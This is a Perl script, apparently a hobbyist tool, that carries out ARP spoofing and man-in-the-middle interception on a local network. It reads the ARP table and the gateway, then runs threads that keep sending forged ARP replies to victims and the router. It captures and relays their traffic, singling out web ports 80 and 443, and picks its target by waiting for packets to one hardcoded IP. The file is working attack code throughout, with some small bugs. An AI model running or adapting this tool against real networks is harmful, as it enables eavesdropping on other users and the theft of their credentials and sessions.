#!/usr/bin/env perl
use Net::Pcap;
use NetPacket::Ethernet qw(:strip);
use NetPacket::IP qw(:strip);
use NetPacket::TCP qw(:strip);
use threads;
use v5.26;

my @route = get_route();
my $arp_t = arp_table();
my $dev = select_dev();
chomp ($arp_t->{my_mac} = `ifconfig $dev | grep 'ether ' |awk '{ print \$2}'`);
chomp($arp_t->{my_ip} = `ifconfig $dev | grep 'inet ' |awk '{ print \$2}'`);

my $pcap;
my $err;
$pcap = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";

threads->create(sub {
		while(1){
			foreach(1 .. $arp_t->{cnt}){
				send_arp($arp_t->{$_}->{mac},$arp_t->{my_mac},$arp_t->{$_}->{ip},$route[0]);
				send_arp($route[1],$arp_t->{my_mac},$route[0],$arp_t->{$_}->{ip});
		}
		sleep 5;
		}
});

my @listing = snif_packet($dev);
my $map = make_hash(@listing);
#my %map = make_hash(@listing);

$map->{my_mac} = $arp_t->{my_mac};
$map->{my_ip} = $arp_t->{my_ip};
#chomp ($map->{my_mac} = `ifconfig $dev | grep 'ether ' |awk '{ print \$2}'`);
#chomp($map->{my_ip} = `ifconfig $dev | grep 'inet ' |awk '{ print \$2}'`);

threads->create(sub {
		while(1){
			send_arp($map->{cli_mac}, $map->{my_mac}, $map->{cli_ip}, $route[0]);
			send_arp($route[1], $map->{my_mac}, $route[0], $map->{cli_ip});
			sleep 3;
			}
			});

spoofing_packet($dev);

pcap_close($pcap);

sub arp_table{
	my	$a = `arp -a`;
	my	$table = {};
	my	$cnt = 1;
	my	$dev = "en0";
	foreach (split "\n",$a){
		if (/((\d{1,3}+\.?){4})(\) at )(.+)( on )($dev)/){
			unless($4 =~ /incomplete/){
				$table->{$cnt}->{ip} = $1;
				$table->{$cnt}->{mac} = $4;
				$cnt++;
			}
		}
	}

	foreach (1 .. $cnt-1){
		if(length($table->{$_}->{mac}) < 17){
			my $tmp;
			my $cnt = 6;
			foreach(split ":",$table->{$_}->{mac}){
				if(length($_) == 1){ $tmp .= "0$_"; }
				else{ $tmp .= $_; }
				$cnt --;
				$tmp .= ":" if($cnt);
			}
			$table->{$_}->{mac} = $tmp;
		}
	}
	return $table;
}

=eod
sub arp_spoofing{
	my $cnt = 1;
	while($cnt){
		send_arp($map->{cli_mac}, $map->{my_mac}, $map->{cli_ip}, $route[0]);
		send_arp($route[1], $map->{my_mac}, $route[0], $map->{cli_ip});
		$cnt --;
	}
}
=cut
sub send_arp{ #dest_mac , $src_mac , $dest_ip, $src_ip 
	my @dest_mac = split (/:/,$_[0]);
	my @src_mac = split (/:/, $_[1]);
	my @dest_ip = split (/\./,$_[2]);
	my @src_ip = split (/\./, $_[3]);

	my $arp_packet .= make_hex(@dest_mac,"mac");
	$arp_packet .= make_hex(@src_mac,"mac");
	$arp_packet .= "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
	$arp_packet .= make_hex(@src_mac, "mac");
	$arp_packet .= make_hex(@src_ip, "ip");
	$arp_packet .= make_hex(@dest_mac, "mac");
	$arp_packet .= make_hex(@dest_ip, "ip");
	Net::Pcap::sendpacket($pcap,$arp_packet);
}

sub make_hex{
	my $ret ="";
	my $chk = pop;
	my $tmp;
	foreach(@_){
		if($chk eq "ip"){ $tmp = sprintf("%02x",$_);}
		else { $tmp = $_;}
		$ret .= chr(hex($tmp));
	}
	return $ret;
}

sub spoofing_packet{
	my $filter;
	my $dev = shift;
	
	my $find_packet = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";

	while(1){
		my ($packet, %header);
		Net::Pcap::pcap_next_ex($find_packet, \%header, \$packet);
		my $ip_obj  = NetPacket::IP->decode( eth_strip($packet) );
		my $eth_obj = NetPacket::Ethernet->decode($packet);
		my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});


			if ($tcp_obj->{dest_port} == 80 || $tcp_obj->{dest_port} == 443){ #redirect packet
				my $re_packet = change_dest_mac($packet,$route[1]);
				pcap_sendpacket($find_packet,$re_packet);
			}
			elsif ($tcp_obj->{src_port} == 80 || $tcp_obj->{src_port} == 443){ #redirect packet
				my $re_packet = change_dest_mac($packet,$map->{cli_mac});
				pcap_sendpacket($find_packet,$re_packet);
			
			}
			elsif (split_mac($eth_obj->{dest_mac}) eq $map->{my_mac} && $ip_obj->{dest_ip} ne $map->{my_ip} && $ip_obj->{src_ip} eq $map->{cli_ip}){ #send route packet
				my $re_packet = change_dest_mac($packet,$route[1]);
				pcap_sendpacket($find_packet,$re_packet);

			}
			elsif ($ip_obj->{dest_ip} ne $map->{my_ip} && split_mac($eth_obj->{dest_mac}) eq $map->{my_mac}){ #send client packet
				my $re_packet = change_dest_mac($packet,$map->{cli_mac});
				pcap_sendpacket($find_packet,$re_packet);

			}
			else {print : "undefind pcaket \n";}
	}
}

sub change_dest_mac{
	my @tmp = split "",$_[0];
	my @mac = split ":",$_[1];
	my $index = 0;
	foreach(@mac){
		$tmp[$index] = chr(hex($_));
		$index++;
	}
#my $ret = sprintf("@tmp");
	my $ret;
	foreach(@tmp){
		$ret .= $_;
	}
#my $ret = sprintf("@tmp");
	$ret =~ s/ //g;
	return $ret
}

sub snif_packet{
	print "Start packet capture \n";
	my @ret;
	my $dev = shift;
	$pcap = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";

	while(1){
		my ($packet, %header);
		Net::Pcap::pcap_next_ex($pcap, \%header, \$packet);
		my $ip_obj  = NetPacket::IP->decode( eth_strip($packet) );
		my $eth_obj = NetPacket::Ethernet->decode($packet);

		if ($ip_obj->{dest_ip} eq "175.213.35.39"){
			push @ret , $ip_obj->{src_ip};
			push @ret , split_mac($eth_obj->{src_mac});
			push @ret , $ip_obj->{dest_ip};
			push @ret , split_mac($eth_obj->{dest_mac});
			push @ret , $packet;
			last;
		}
	}
	return @ret;
}

sub split_mac{
	my $mac = shift;
	my $ret;
	if (length($mac) == 12){
		my @tmp = split "",$mac;
		my $cnt = 5;
		my $flag = 1;
		foreach(@tmp){
			$ret .= $_;
			$flag *= -1;
			if($cnt && $flag > 0){$ret .= ":"; $cnt--;}
		}
	}
	else {
		$mac = "0".$mac;
		my @tmp = split "",$mac;
		my $cnt = 5;
		my $flag = 1;
		foreach(@tmp){
			$ret .= $_;
			$flag *= -1;
			if($cnt && $flag > 0){$ret .= ":"; $cnt--;}
		}
	}
	return $ret;
}

sub select_dev{
	my @all_dev = Net::Pcap::findalldevs(\$err);
	my $cnt = 1;
	foreach (@all_dev){
		print "$cnt : $_ \n";
		$cnt ++;
	}
	print "Selcet Device number : ";
	my $ret = <>;
	return $all_dev[$ret-1];
}

sub make_hash{
	my @listing = @_;
	my $map = {};
	print "1. $listing[0] / $listing[1]\n";
	print "2. $listing[2] / $listing[3]\n";
	print "select server number : ";
	my $cnt = <>;
	if ($cnt == 1 ){
		$map->{ser_ip} = $listing[0];
		$map->{ser_mac} = $listing[1];
		$map->{cli_ip} = $listing[2];
		$map->{cli_mac} = $listing[3];
	}
	elsif ($cnt == 2) {
		$map->{ser_ip} = $listing[2];
		$map->{ser_mac} = $listing[3];
		$map->{cli_ip} = $listing[0];
		$map->{cli_mac} = $listing[1];
	}

	else {print "Err number _ \n";}
	print "Target ip : $map->{cli_ip}\n";
	print "Target mac : $map->{cli_mac}\n";
	print "Route ip : $route[0]\n";
	print "Route mac : $route[1]\n";
	return $map;
}

sub get_route{
	my @ret;
	my $ip;
	my @a  = split "\n",`route get default`; foreach(@a){
		if(/gateway: /){ push @ret, $'; $ip = $'; last; }
	}
	my @b = split "\n",`arp -a`; foreach(@b){
		if(/( \($ip\) at )(.+:..)/) { push @ret, $2; last;}
	}
	return @ret;
}
